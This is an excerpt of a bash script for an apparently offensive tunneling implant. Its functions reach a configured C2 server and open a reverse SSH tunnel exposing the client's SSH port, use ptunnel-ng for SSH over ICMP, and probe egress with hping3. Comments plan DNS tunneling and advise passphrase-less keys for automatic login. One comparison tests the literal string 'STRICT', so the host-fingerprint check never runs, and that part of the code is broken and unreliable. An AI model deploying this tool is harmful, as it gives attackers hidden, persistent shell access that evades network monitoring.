...
# ToDo
#------
# 1. Make checks for "STRICT" in each of the modules
# 2. Add DNS tunneling
...
# STRICT is whether or not to check for TLS/SSH fingerprints. Set to 1 if you
# want to enforce signature verifications. Set to 0 if you may be subject to
# TLS inspection. If you're unsure, set it to 0.
# Example: STRICT=1
STRICT=0

# SRV is the IP address or FQDN of the server you want to connect to
# Example: SRV=c2.yourdomain.com
# Example: SRV=1.2.3.4
SRV=
...
# SSHID is the id file on the /client/ to send to the server
# You should create a key with no passphrase to ensure the
# client can log in automatically.
# Example: /root/.ssh/id_blank
SSHID=
...
# You can get this with: ssh-keyscan x.x.x.x -t ecdsa 2>/dev/null | ssh-keygen -lf - | awk -F ':' '{print $2}' | awk '{print $1}' | head -1
...
# ---------------------------
#
# Or do. I'm not your parent. ¯\_(ツ)_/¯
...
function graft-ssh {
  ...
  ssh $USER@$SRV -i $SSHID -R $RPORT:127.0.0.1:22 -p $SSHPORT -F /dev/null
  RV=$?
  if [ "$RV" == "0" ]; then
...
function graft-icmp() {
  ...
  echo "[OK]" >> $LF
  sleep 2
  ssh $USER@localhost -i $SSHID -p$RPORT -R $LPORT:localhost:$LSSHPORT
  killall ptunnel-ng
  exit
...
function graft-main() {
  ...
  echo 
  if [ "$STRICT" == "0" ]; then
    echo "Certificate checking not enforced."
    echo "To change, set \"STRICT\" to \"1\""
  else
    echo "Certificate checking enforced."
    echo "To change, set \"STRICT\" to \"0\""
  fi
  echo
  echo -n "HTTPS ... "
  echo -n "$(date) - Testing HTTPS access to $SRV on port $HPORT ... " >> $LF
  hping3 $SRV -S -c 1 -p $HPORT &> /dev/null | grep SA
  if [ "$?" == "0" ]; then
    echo "[OK]" >> $LF
    echo -e "\e[32m[OK]\e[39m"
    HTTPC="0"
  ...
  if [[ "$SSHC" == "0" && "STRICT" == "1" ]]; then
    ...
    SIGTMP=$(ssh-keyscan -p $SSHPORT -t ecdsa $SRV 2>/dev/null | ssh-keygen -lf- | awk -F ':' '{print $2}' | awk '{print $1}' | head -1)
    if [ "$SIG" != "$SIGTMP" ]; then
